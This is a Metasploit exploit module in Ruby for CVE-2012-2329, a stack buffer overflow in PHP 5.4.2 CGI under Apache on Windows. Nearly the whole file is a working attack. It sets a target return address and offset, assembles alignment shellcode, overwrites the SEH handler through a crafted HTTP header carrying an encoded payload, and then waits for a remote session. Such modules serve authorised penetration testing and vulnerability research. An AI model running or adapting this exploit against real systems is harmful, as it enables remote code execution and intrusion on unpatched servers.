##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::Seh

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'PHP apache_request_headers Function Buffer Overflow',
      'Description'    => %q{
          This module exploits a stack based buffer overflow in the CGI version of PHP
        5.4.x before 5.4.3. The vulnerability is due to the insecure handling of the
        HTTP headers.

          This module has been tested against the thread safe version of PHP 5.4.2,
        from "windows.php.net", running with Apache 2.2.22 from "apachelounge.com".
      },
      'Author'         =>
        [
          'Vincent Danen', # Vulnerability discovery
          'juan vazquez', # Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'Version'        => '$Revision$',
      'References'     =>
        [
          [ 'CVE', '2012-2329'],
          [ 'OSVDB', '82215'],
          [ 'BID', '53455'],
          [ 'URL', 'http://www.php.net/archive/2012.php#id2012-05-08-1' ],
          [ 'URL', 'http://www.php.net/ChangeLog-5.php#5.4.3'],
          [ 'URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=820000' ]
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'process',
        },
      'Privileged'     => true,
      'Payload'        =>
        {
          'Space'       => 1321,
          'DisableNops' => true,
          'BadChars'    => "\x00\x0d\x0a\x5f\x80\x8e\x9e\x9f" + (0x41..0x5a).to_a.pack("C*") + (0x82..0x8c).to_a.pack("C*") + (0x91..0x9c).to_a.pack("C*"),
          'EncoderType' => Msf::Encoder::Type::NonUpperUnderscoreSafe,
          'EncoderOptions' =>
            {
              'BufferOffset' => 0x0
            }
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          ['Windows XP SP3 / Windows 2003 Server SP2 (No DEP) / PHP 5.4.2 Thread safe',
            {
              'Ret'    => 0x1002aa79, # ppr from php5ts.dll
              'Offset' => 1332
            }
          ],
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'May 08 2012'))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The URI path to the php using apache_request_headers', '/php/test.php']),
      ], self.class)

  end

  def exploit
    print_status("Trying target #{target.name}...")

    # Make ECX point to the start of the encoded payload
    align_ecx = "pop esi\n" # "\x5e"
    esi_alignment = target['Offset'] + # Space from the start of align_ecx to nseh handler
      8 + # len(nseh + seh)
      5 - # len(call back)
      11 # len(align_ecx)
    align_ecx << "add esi, -#{esi_alignment}\n" # "\x81\xC6" + 4 bytes imm (ex: "\xCA\xFA\xFF\xFF")
    align_ecx << "sub ecx, ecx\n" # "\x29\xC9"
    align_ecx << "add ecx, esi" # "\x01\xf1"
    sploit = Metasm::Shellcode.assemble(Metasm::Ia32.new, align_ecx).encode_string
    # Encoded payload
    sploit << payload.encoded
    # Padding if needed
    sploit << rand_text(target['Offset']-sploit.length)
    # SEH handler overwrite
    sploit << generate_seh_record(target.ret)
    # Call back "\xE8" + 4 bytes imm (ex: "\xBF\xFA\xFF\xFF")
    sploit << Metasm::Shellcode.assemble(Metasm::Ia32.new, "call $-#{target['Offset']+8}").encode_string
    # Make it crash
    sploit << rand_text(4096 - sploit.length)

    print_status("Sending request to #{datastore['RHOST']}:#{datastore['RPORT']}")

    res = send_request_cgi({
      'uri'          => target_uri.to_s,
      'method'       => 'GET',
      'headers'      =>
      {
        "HTTP_X_#{rand_text_alpha_lower(4)}" => sploit,
      }
    })

    if res and res.code == 500
      print_status "We got a 500 error code. Even without a session it could be an exploitation signal!"
    end

    handler
  end
end
